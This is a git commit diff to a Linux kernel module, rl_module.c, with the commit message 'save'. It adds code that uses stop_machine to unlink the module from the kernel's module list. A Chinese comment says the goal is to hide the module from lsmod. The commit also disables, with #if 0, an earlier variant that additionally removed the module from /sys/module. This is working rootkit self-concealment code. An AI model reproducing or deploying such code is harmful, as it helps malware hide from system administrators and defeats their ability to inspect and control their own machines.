43592278ccf0a475661b542661c763eebebb6176
liuyutao <liu_yt@neusoft.com>
2015-06-16 14:47:36 +0800

    save
    Signed-off-by: liuyutao <liu_yt@neusoft.com>

--- kernel/rl_module.c
+++ kernel/rl_module.c
@@ -7,22 +7,36 @@
 #include <linux/sched.h>
 #include <linux/netdevice.h>
 #include <linux/list.h>
+#include <linux/stop_machine.h>
 
 //#include "rl_module.h"
 
 MODULE_LICENSE("Dual BSD/GPL");
 
 
+static int rl_unlink_module(void *_mod)
+{
+    struct module *mod = _mod;
+    list_del(&mod->list);
+
+    return 0;
+}
+
 static int __init rl_init(void)
 {
     printk("RL Module init!\n");
 
     //对lsmod命令隐藏模块名称
+    mutex_lock(&module_mutex);
+    stop_machine(rl_unlink_module, THIS_MODULE, NULL);
+    mutex_unlock(&module_mutex);
+
+#if 0
     list_del_init(&THIS_MODULE->list);
 
     //从/sys/module/目录下隐藏模块
     kobject_del(&THIS_MODULE->mkobj.kobj);
-
+#endif
 	return 0;
 }
 
